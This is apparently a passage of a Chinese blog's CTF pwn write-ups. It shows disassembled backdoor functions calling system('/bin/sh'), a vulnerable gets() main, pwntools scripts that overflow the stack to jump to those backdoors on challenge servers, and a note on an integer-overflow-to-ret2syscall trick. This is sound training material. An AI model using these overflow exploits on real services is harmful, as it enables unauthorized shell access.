+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0804851B</span>                               ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">0804851B</span></span><br><span class="line">.text:<span class="number">0804851B</span>                               ; Attributes: bp-based frame</span><br><span class="line">.text:<span class="number">0804851B</span></span><br><span class="line">.text:<span class="number">0804851B</span>                               ; <span class="function"><span class="type">int</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function">.text:<span class="number">0804851B</span>                               public shell</span></span><br><span class="line"><span class="function">.text:<span class="number">0804851B</span>                               shell proc near</span></span><br><span class="line"><span class="function">.text:<span class="number">0804851B</span>                               ;</span> __unwind &#123;</span><br><span class="line">.text:<span class="number">0804851B</span> <span class="number">55</span>                            push    ebp</span><br><span class="line">.text:<span class="number">0804851</span>C <span class="number">89</span> E5                         mov     ebp, esp</span><br><span class="line">.text:<span class="number">0804851</span>E <span class="number">83</span> EC <span class="number">08</span>                      sub     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">08048521</span> <span class="number">83</span> EC <span class="number">0</span>C                      sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">08048524</span> <span class="number">68</span> <span class="number">50</span> <span class="number">86</span> <span class="number">04</span> <span class="number">08</span>                push    offset command                  ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">08048529</span> E8 B2 FE FF FF                call    _system</span><br><span class="line">.text:<span class="number">08048529</span></span><br><span class="line">.text:<span class="number">0804852</span>E <span class="number">83</span> C4 <span class="number">10</span>                      add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">08048531</span> <span class="number">90</span>                            nop</span><br><span class="line">.text:<span class="number">08048532</span> C9                            leave</span><br><span class="line">.text:<span class="number">08048533</span> C3                            retn</span><br><span class="line">.text:<span class="number">08048533</span>                               ; &#125; <span class="comment">// starts at 804851B</span></span><br><span class="line">.text:<span class="number">08048533</span></span><br><span class="line">.text:<span class="number">08048533</span>                               shell endp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_host_post</span>(<span class="params">url</span>):</span><br><span class="line">    tmp_ = url.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    host_ = tmp_[<span class="number">0</span>]</span><br><span class="line">    post_ = <span class="built_in">int</span>(tmp_[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> host_, post_</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">where = <span class="string">r&quot;D:\yzzob\Desktop\wustctf2020_getshell&quot;</span></span><br><span class="line">elf = ELF(where)</span><br><span class="line">elf.checksec()</span><br><span class="line">url = <span class="string">&quot;node5.buuoj.cn:26453&quot;</span></span><br><span class="line">host, post = get_host_post(url)</span><br><span class="line">p = remote(host, post)</span><br><span class="line">bp = <span class="number">32</span></span><br><span class="line">long = <span class="number">0x18</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())  # 利用pwntools来构造shellcode，asm指转换为机器码</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># payload = b&#x27;A&#x27; * 24 + p64(shellcode_addr) + shellcode</span></span><br><span class="line"><span class="comment"># p.recv()</span></span><br><span class="line"><span class="comment"># p.sendline(payload)</span></span><br><span class="line"><span class="comment"># print_flag = elf.sym[&#x27;print_flag&#x27;]</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x804851B</span></span><br><span class="line"><span class="comment"># # ret_addr = 0x40101als</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # p = process(r&quot;D:\yzzob\Desktop\trop&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> bp == <span class="number">64</span>:</span><br><span class="line">    <span class="comment"># payload = b&#x27;a&#x27; * (long + 8) + p64(print_flag)</span></span><br><span class="line">    <span class="comment"># payload = b&#x27;a&#x27;*long+ p64(ret_addr) + p64(backdoor)</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * (long+<span class="number">8</span>)+ p64(backdoor)</span><br><span class="line">    <span class="comment"># p.sendlineafter(&quot;chance!&quot;, payload)</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="comment"># p.recvall()</span></span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*(long+<span class="number">4</span>) + p32(backdoor)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2><span id="ret2text">ret2text</span></h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401286</span>                               init endp</span><br><span class="line">.text:<span class="number">0000000000401286</span></span><br><span class="line">.text:<span class="number">0000000000401286</span>                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000040128B</span> <span class="number">0F</span> <span class="number">1F</span> <span class="number">44</span> <span class="number">00</span> <span class="number">00</span>                align <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0000000000401290</span></span><br><span class="line">.text:<span class="number">0000000000401290</span>                               ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">0000000000401290</span></span><br><span class="line">.text:<span class="number">0000000000401290</span></span><br><span class="line">.text:<span class="number">0000000000401290</span>                               ; <span class="function"><span class="type">int</span> <span class="title">boy_next_door</span><span class="params">()</span></span></span><br><span class="line"><span class="function">.text:<span class="number">0000000000401290</span>                               public boy_next_door</span></span><br><span class="line"><span class="function">.text:<span class="number">0000000000401290</span>                               boy_next_door proc near</span></span><br><span class="line"><span class="function">.text:<span class="number">0000000000401290</span>                               ;</span> __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401290</span> F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64</span><br><span class="line">.text:<span class="number">0000000000401294</span> <span class="number">48</span> <span class="number">83</span> EC <span class="number">08</span>                   sub     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">0000000000401298</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">3</span>D <span class="number">65</span> <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span>          lea     rdi, aYouFindMyBackd            ; <span class="string">&quot;You find my backdoor!?&quot;</span></span><br><span class="line">.text:<span class="number">000000000040129F</span> E8 DC FD FF FF                call    _puts</span><br><span class="line">.text:<span class="number">000000000040129F</span></span><br><span class="line">.text:<span class="number">00000000004012</span>A4 <span class="number">48</span> <span class="number">8</span>D <span class="number">3</span>D CB <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span>          lea     rdi, command                    ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">00000000004012</span>AB <span class="number">48</span> <span class="number">83</span> C4 <span class="number">08</span>                   add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000000004012</span>AF E9 DC FD FF FF                jmp     _system</span><br><span class="line">.text:<span class="number">00000000004012</span>AF                               ; &#125; <span class="comment">// starts at 401290</span></span><br><span class="line">.text:<span class="number">00000000004012</span>AF</span><br><span class="line">.text:<span class="number">00000000004012</span>AF                               boy_next_door endp</span><br><span class="line">.text:<span class="number">00000000004012</span>AF</span><br><span class="line">.text:<span class="number">00000000004012</span>AF                               _text ends</span><br><span class="line">.text:<span class="number">00000000004012</span>AF</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">18</span>]; <span class="comment">// [rsp+6h] [rbp-12h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">init</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s play a game!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Guess my number one chance!&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(s1);</span><br><span class="line">  v3 = <span class="string">&quot;Right! But...&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, NUM) )</span><br><span class="line">    v3 = <span class="string">&quot;Error! However...&quot;</span>;</span><br><span class="line">  <span class="built_in">puts</span>(v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">backdoor = <span class="number">0x4012A4</span></span><br><span class="line">p = remote(<span class="string">&quot;150.158.160.64&quot;</span>,<span class="number">41892</span>)</span><br><span class="line">payload = <span class="string">b&quot;b&quot;</span>*(<span class="number">0xa</span>+<span class="number">8</span>) + p64(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2><span id="整数溢出ret2syscall">整数溢出;ret2syscall</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先需要输入一个数字c，让初始为114的b加上c不能小于514，最后a=b进行赋值，要求a&lt;0</span><br><span class="line"></span><br><span class="line">但是这里的b和c都是uint16，而a是int16，所以存在整数溢出的问题</span><br><span class="line"></span><br><span class="line">如果我们输入的c是-115，那么b+=c之后b成为了-1，但是由于uint16是无符号数，被解析后是65535，所以一定是大于514的</span><br><span class="line"></span><br><span class="line">这样第一关就过了，之后就是简单的ret2syscall。</span><br></pre></td></tr></table></figure>
+
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/img/cart_cover.jpg"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<div>分享</div>
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+			<a href="/2024/05/22/RSA/" title="CRYPTO" rel="prev">
+				&laquo;上一篇
+			</a>
+		
+		
+			<a href="/2024/05/22/NKCTF2024/" title="NKCTF" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/05/22/%E6%9D%82%E8%A8%80/" title="杂言">
+								杂言			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 22日, 2024				
+							</p>
+							<p class="relate-post-content">
+								
+  46dd145f76e505a9a6c269068bf920ad40b558a3340574b16606fabf2fd2f4d0fcc53141661e2222cc25e406d10dba105ca71d0b93f79fbf26...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/05/22/%E6%9D%82%E8%A8%80/" title="杂言">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="杂言"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/05/22/%E6%9D%82%E9%A1%B9/" title="杂项">
+								杂项			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 22日, 2024				
+							</p>
+							<p class="relate-post-content">
+								1.问题方向 2.问题分类todolist12345678910111213141.木马//2.pyhton&#x27;s sql//3.java&#x27;s sql4.ocr5.skl(/*非校园网登录*/集成到手机上)6. ka...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/05/22/%E6%9D%82%E9%A1%B9/" title="杂项">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="杂项"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/05/22/zjnu_write_up/" title="zjnu_write_up">
+								zjnu_write_up			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 22日, 2024				
+							</p>
+							<p class="relate-post-content">
+								1.比赛名 2.题目类别 3.题目名称 4.知识点关键词 5.知识点细节12https://ctf.a1natas.com/games/14/scoreboardhttps://ctf.a1natas.com/games/12/sco...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/05/22/zjnu_write_up/" title="zjnu_write_up">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="zjnu_write_up"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/05/22/RSA/" title="CRYPTO">
+								CRYPTO			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 22日, 2024				
+							</p>
+							<p class="relate-post-content">
+								RSAinverse(e, a)概念版:
+公钥的获取
+123456def get_D(e,phi):    i=1    while True:    	i = i + 1        if (e*i) % p == 1:     ...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/05/22/RSA/" title="CRYPTO">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="CRYPTO"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/05/22/NKCTF2024/" title="NKCTF">
+								NKCTF			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 22日, 2024				
+							</p>
+							<p class="relate-post-content">
+								
+1.题目类别 2.题目名称MISCWebshell_pro1
+CRYPTOPWN来签个到1
+WEBREVERSElogin_system1
+VM？VM！1
+1VM虚拟机，我们喜欢你，我们喜欢vmware，QEMU，还有Hyper-V...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/05/22/NKCTF2024/" title="NKCTF">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="NKCTF"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/05/22/hexo/" title="hexo">
+								hexo			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 22日, 2024				
+							</p>
+							<p class="relate-post-content">
+								小记标题格式1title:%20(标题)
+
+目录设置1&lt;!-- toc --&gt;
+
+安装插件在D:\10_yzzob_web_again下打开git bash here
+1npm install hexo-toc --sav...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/05/22/hexo/" title="hexo">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="hexo"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/05/22/hello-world/" title="Hello World">
+								Hello World			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 22日, 2024				
+							</p>
+							<p class="relate-post-content">
+								
+
+
+Quick Start
+Create a new post
+Run server
+Generate static files
+Deploy to remote sites
+
+
+
+
+
+Welcome to Hexo! This i...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/05/22/hello-world/" title="Hello World">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="Hello World"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/05/22/draft/" title="draft">
+								draft			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 22日, 2024				
+							</p>
+							<p class="relate-post-content">
+								
+  46dd145f76e505a9a6c269068bf920add17329ee7b381137cf8d07d2b9c90cbbf197cd240bb5a7eeb75a5d288900ed1b4fbc3474eda54c4290...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/05/22/draft/" title="draft">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="draft"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/05/22/different%20views/" title="different views">
+								different views			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 22日, 2024				
+							</p>
+							<p class="relate-post-content">
+								1.题目分类2.所给内容MISC损坏的文件2.来自提瓦特的神秘文件.zip
+用010editor打开
+不全zip头:504B0304
+解压缩是奇怪的文字图片,
+根据题目可以翻译的到flag
+也可以保存下来用百度等浏览器扫扫看
+条形码
+...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/05/22/different%20views/" title="different views">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="different views"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/05/22/ctfs/" title="ctfs">
+								ctfs			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 22日, 2024				
+							</p>
+							<p class="relate-post-content">
+								1232024 长城杯信息安全铁人三项赛www.xyctf.tophttps://ctf.a1natas.com/games
+
+
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/05/22/ctfs/" title="ctfs">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="ctfs"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+		<div class="config-info">
+			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
+		</div>	
+	
+
+</div>
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+
+		
+			
+			<!-- socialShare share -->
+			<div class="social-share"></div>
+
+<!--  css & js -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+			
+		
+		
+	
+</div>
+
+
+				</div>
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	 
+	
+<script src="/plugin/clipboard/clipboard.js"></script>
+
+	<script>
+		// Copy code !
+	    function preprocessing() {
+	        $("#article-content .highlight").each(function() {
+	            $(this).wrap('<div id="post-code"></div>');
+	        })
+
+	        $("#article-content #post-code").each(function() {
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            let languageClass = $(this).next().attr('class'),
+	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+	            $(this).append('<span class="copy-btn icon-paste"></span>');
+	        });
+	    }
+
+		function copy() {
+		    $('#article-content #post-code').each(function(i) {
+		        let codeCopyId = 'codeCopy-' + i;
+
+		        let codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+   
+			let clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn icon-clipboard1');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn icon-paste');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');   
+			});
+			
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		}
+		
+		(function copyCode(){
+			if ($('.layout-post').length) {
+			    preprocessing();
+			    copy();
+			} 
+		})();
+	</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
+			let imgPath = $(this).attr('src'),
+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2017 - 2024, content by Sariay. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	
+<script src="/plugin/motto/motto.js"></script>
+
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('<br1>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+	
+
+  
+
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+
+	</body>	
+</html>
